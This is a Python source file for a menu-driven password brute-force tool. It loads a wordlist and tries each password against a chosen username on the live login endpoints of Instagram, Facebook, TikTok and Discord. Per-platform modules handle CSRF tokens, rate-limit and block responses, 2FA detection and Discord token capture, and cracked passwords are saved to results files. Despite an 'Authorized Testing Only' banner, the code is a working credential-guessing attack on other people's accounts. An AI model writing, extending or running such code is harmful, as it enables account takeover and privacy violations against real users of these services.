#!/usr/bin/env python3
import os, sys, time, json, signal, datetime, importlib
import urllib3; urllib3.disable_warnings()

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except:
    class C: pass
    Fore = C(); Back = C(); Style = C()
    for c in "RED,GREEN,YELLOW,BLUE,MAGENTA,CYAN,WHITE,RESET".split(","):
        setattr(Fore, c, ""); setattr(Back, c, "")
    Style.BRIGHT = ""; Style.RESET_ALL = ""

BANNER = """\033[91m
    ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗
    ██╔══██╗╚██╗ ██╔╝██╔══██╗████╗  ██║
    ██████╔╝ ╚████╔╝ ███████║██╔██╗ ██║
    ██╔══██╗  ╚██╔╝  ██╔══██║██║╚██╗██║
    ██║  ██║   ██║   ██║  ██║██║ ╚████║
    ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝
\033[0m"""

MODULES = {}

def load_modules():
    modules_dir = os.path.join(os.path.dirname(__file__), "modules")
    if not os.path.exists(modules_dir):
        os.makedirs(modules_dir); create_default_modules()
    sys.path.insert(0, modules_dir)
    for f in sorted(os.listdir(modules_dir)):
        if f.endswith(".py") and not f.startswith("__"):
            name = f.replace(".py", "")
            try:
                spec = importlib.util.spec_from_file_location(name, os.path.join(modules_dir, f))
                mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)
                if hasattr(mod, "Platform"):
                    MODULES[name] = mod.Platform()
            except: pass

def signal_handler(sig, frame):
    print(f"\n{Fore.RED}[!] Interrupted{Style.RESET_ALL}"); sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

def show_banner():
    os.system("clear" if os.name == "posix" else "cls")
    print(BANNER)
    print(f"{Fore.WHITE}        Multi-Platform Password Testing Tool v1.0{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}        Authorized Testing Only{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")

def show_modules():
    print(f"{Fore.CYAN}AVAILABLE MODULES:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'-'*35}{Style.RESET_ALL}")
    i = 1; module_list = []
    for name, mod in sorted(MODULES.items()):
        color = getattr(Fore, mod.color.upper(), Fore.WHITE)
        print(f"  {color}[{i:>2}] {mod.emoji} {mod.name}{Style.RESET_ALL}")
        module_list.append(name); i += 1
    print(f"  {Fore.GREEN}[{i:>2}] 🔄 ALL MODULES{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'-'*35}{Style.RESET_ALL}")
    return module_list

def load_wordlist(path):
    if not os.path.exists(path):
        with open(path, "w") as f:
            f.write("Password1\nTest1234!\nletmein\nadmin123\nWelcome1\nSummer2025\n")
        print(f"{Fore.YELLOW}[!] Created sample: {path}{Style.RESET_ALL}")
    with open(path, encoding="utf-8", errors="ignore") as f:
        return [l.strip() for l in f if l.strip()]

def save_result(platform, username, password, extra=""):
    os.makedirs("results", exist_ok=True)
    fn = f"results/success_{platform}_{username}.txt"
    with open(fn, "w") as f:
        f.write(f"RYAN-HYDRA RESULTS\n{'='*40}\nPlatform: {platform}\nUsername: {username}\nPassword: {password}\nDate: {datetime.datetime.now()}\n")
        if extra: f.write(f"Extra: {extra}\n")
    print(f"\n{Fore.GREEN}[✓] Saved: {fn}{Style.RESET_ALL}")

def run_single(mod_name, username, passwords, delay, proxies):
    mod = MODULES[mod_name]
    color = getattr(Fore, mod.color.upper(), Fore.WHITE)
    print(f"\n{color}{'='*45}{Style.RESET_ALL}")
    print(f"{color}{mod.emoji} {mod.name} Attack{Style.RESET_ALL}")
    print(f"{color}Target: {username} | Passwords: {len(passwords)} | Delay: {delay}s{Style.RESET_ALL}")
    print(f"{color}{'='*45}{Style.RESET_ALL}\n")
    try: mod.setup()
    except Exception as e:
        print(f"{Fore.RED}[!] Setup failed: {e}{Style.RESET_ALL}"); return False
    ac = 0; rc = 0
    for idx, pwd in enumerate(passwords, 1):
        ac += 1
        if ac > 5:
            print(f"{Fore.YELLOW}[!] Rate limit pause: 10s{Style.RESET_ALL}"); time.sleep(10); ac = 0
        display = pwd[:25] + "..." if len(pwd) > 25 else pwd
        print(f"{Fore.BLUE}[{idx:>4}/{len(passwords)}]{Style.RESET_ALL} {color}{mod.emoji}{Style.RESET_ALL} Trying: {Fore.CYAN}{display:<30}{Style.RESET_ALL}", end="\r")
        try:
            result = mod.attempt(username, pwd)
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error: {str(e)[:40]}{Style.RESET_ALL}"); time.sleep(delay); continue
        if result.get("success"):
            print(f"\n{' '*60}\n{Back.GREEN}{Fore.BLACK}  ✅ PASSWORD FOUND: {pwd}  {Style.RESET_ALL}")
            extra = ""
            if result.get("twofa"): print(f"{Fore.YELLOW}[!] 2FA enabled{Style.RESET_ALL}"); extra = "2FA"
            if result.get("token"): print(f"{Fore.GREEN}[+] Token acquired{Style.RESET_ALL}")
            save_result(mod.name, username, pwd, extra); return True
        elif result.get("blocked"):
            print(f"\n{Fore.YELLOW}[!] Blocked! Waiting 60s...{Style.RESET_ALL}"); time.sleep(60)
        elif result.get("rate_limit"):
            rc += 1
            if rc > 3: print(f"\n{Fore.RED}[!] Too many rate limits{Style.RESET_ALL}"); return False
            time.sleep(result.get("wait", 30))
        else:
            print(f"{Fore.RED}❌{Style.RESET_ALL}", end="\r" if idx < len(passwords) else "\n")
        time.sleep(delay)
    print(f"\n{Fore.RED}[-] Not found for {mod.name}{Style.RESET_ALL}"); return False

def main():
    show_banner()
    print(f"{Fore.CYAN}[*] Loading modules...{Style.RESET_ALL}")
    load_modules()
    if not MODULES:
        print(f"{Fore.RED}[!] No modules! Creating defaults...{Style.RESET_ALL}")
        create_default_modules(); load_modules()
    module_list = show_modules()
    print()
    choice = input(f"{Fore.GREEN}[?] Select module [1-{len(module_list)+1}]: {Style.RESET_ALL}").strip()
    try: choice_idx = int(choice) - 1
    except: print(f"{Fore.RED}[!] Invalid{Style.RESET_ALL}"); return
    run_all = choice_idx == len(module_list)
    if choice_idx < 0 or choice_idx > len(module_list): print(f"{Fore.RED}[!] Invalid{Style.RESET_ALL}"); return
    username = input(f"{Fore.GREEN}[?] Target username/email: {Style.RESET_ALL}").strip()
    if not username: print(f"{Fore.RED}[!] Required{Style.RESET_ALL}"); return
    wl = input(f"{Fore.GREEN}[?] Wordlist [wordlists/passwords.txt]: {Style.RESET_ALL}").strip() or "wordlists/passwords.txt"
    passwords = load_wordlist(wl)
    if not passwords: print(f"{Fore.RED}[!] No passwords{Style.RESET_ALL}"); return
    print(f"{Fore.CYAN}[*] Loaded {len(passwords)} passwords{Style.RESET_ALL}")
    d = input(f"{Fore.GREEN}[?] Delay [2]: {Style.RESET_ALL}").strip()
    try: delay = float(d) if d else 2.0
    except: delay = 2.0
    p = input(f"{Fore.GREEN}[?] Use proxy? (y/n) [n]: {Style.RESET_ALL}").strip().lower()
    proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"} if p=="y" else None
    print(f"\n{Fore.YELLOW}[!] Starting in 3s... (Ctrl+C to abort){Style.RESET_ALL}"); time.sleep(3)
    if run_all:
        for name in module_list:
            r = run_single(name, username, passwords, delay, proxies)
            if r:
                c = input(f"{Fore.GREEN}[?] Continue? (y/n): {Style.RESET_ALL}").strip().lower()
                if c != "y": break
            time.sleep(3)
    else:
        run_single(module_list[choice_idx], username, passwords, delay, proxies)
    print(f"\n{Fore.GREEN}Attack complete. Results in ./results/{Style.RESET_ALL}")

def create_default_modules():
    os.makedirs("modules", exist_ok=True)
    modules_code = {
    "instagram.py": '''import requests, time, urllib3
urllib3.disable_warnings()
class Platform:
    name = "Instagram"; emoji = "📸"; color = "magenta"
    def setup(self):
        self.s = requests.Session()
        self.s.headers.update({"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"})
    def attempt(self, u, p):
        try:
            r = self.s.get("https://www.instagram.com/accounts/login/", verify=False, timeout=10)
            csrf = self.s.cookies.get("csrftoken")
            if not csrf: return {"success":False}
            ts = str(int(time.time()))
            enc = f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{p}"
            self.s.headers.update({"X-CSRFToken":csrf,"X-Requested-With":"XMLHttpRequest","Referer":"https://www.instagram.com/accounts/login/"})
            self.s.cookies.set("ig_cb","2")
            r = self.s.post("https://www.instagram.com/accounts/login/ajax/", data={"username":u,"enc_password":enc,"queryParams":"{}","optIntoOneTap":"false"}, verify=False, timeout=10, allow_redirects=False)
            j = r.json()
            if j.get("authenticated"): return {"success":True,"password":p}
            if j.get("two_factor_required"): return {"success":True,"password":p,"twofa":True}
            if "checkpoint" in str(j).lower(): return {"success":False,"blocked":True}
            if "wait" in str(j).lower(): return {"success":False,"rate_limit":True,"wait":30}
            return {"success":False}
        except: return {"success":False}
''',
    "facebook.py": '''import requests, re, urllib3
urllib3.disable_warnings()
class Platform:
    name = "Facebook"; emoji = "📘"; color = "blue"
    def setup(self):
        self.s = requests.Session()
        self.s.headers.update({"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"})
    def attempt(self, u, p):
        try:
            r = self.s.get("https://www.facebook.com/", verify=False, timeout=10)
            lsd = re.search(r'name="lsd" value="([^"]+)"', r.text)
            if not lsd: return {"success":False}
            r = self.s.post("https://www.facebook.com/login.php?login_attempt=1", data={"lsd":lsd.group(1),"email":u,"pass":p,"default_persistent":"0","timezone":"-60","lgndim":"","lgnrnd":"","lgnjs":"n","locale":"en_US","qsstamp":""}, verify=False, timeout=10, allow_redirects=False)
            if "c_user" in self.s.cookies: return {"success":True,"password":p}
            return {"success":False}
        except: return {"success":False}
''',
    "tiktok.py": '''import requests, urllib3
urllib3.disable_warnings()
class Platform:
    name = "TikTok"; emoji = "🎵"; color = "cyan"
    def setup(self):
        self.s = requests.Session()
        self.s.headers.update({"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36","Referer":"https://www.tiktok.com/login"})
    def attempt(self, u, p):
        try:
            r = self.s.post("https://www.tiktok.com/api/v1/auth/login/", data={"username":u,"password":p,"service":"https://www.tiktok.com/"}, verify=False, timeout=10)
            j = r.json()
            if j.get("data",{}).get("user_id"): return {"success":True,"password":p}
            return {"success":False}
        except: return {"success":False}
''',
    "discord.py": '''import requests, json, base64, urllib3
urllib3.disable_warnings()
class Platform:
    name = "Discord"; emoji = "💬"; color = "magenta"
    def setup(self):
        self.s = requests.Session()
        sp = base64.b64encode(json.dumps({"os":"Linux","browser":"Chrome","device":"","system_locale":"en-US","browser_version":"120.0.0.0","os_version":"","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":220222,"client_event_source":None}).encode()).decode()
        self.s.headers.update({"X-Super-Properties":sp,"Content-Type":"application/json","Origin":"https://discord.com","Referer":"https://discord.com/login"})
    def attempt(self, u, p):
        try:
            r = self.s.post("https://discord.com/api/v9/auth/login", json={"login":u,"password":p,"undelete":False}, verify=False, timeout=10)
            if r.status_code == 200:
                if "token" in r.json(): return {"success":True,"password":p,"token":r.json()["token"][:50]}
            if r.status_code == 429: return {"success":False,"rate_limit":True,"wait":60}
            return {"success":False}
        except: return {"success":False}
''',
    }
    for fn, code in modules_code.items():
        with open(f"modules/{fn}", "w") as f: f.write(code)
    print(f"{Fore.GREEN}[+] Default modules created{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
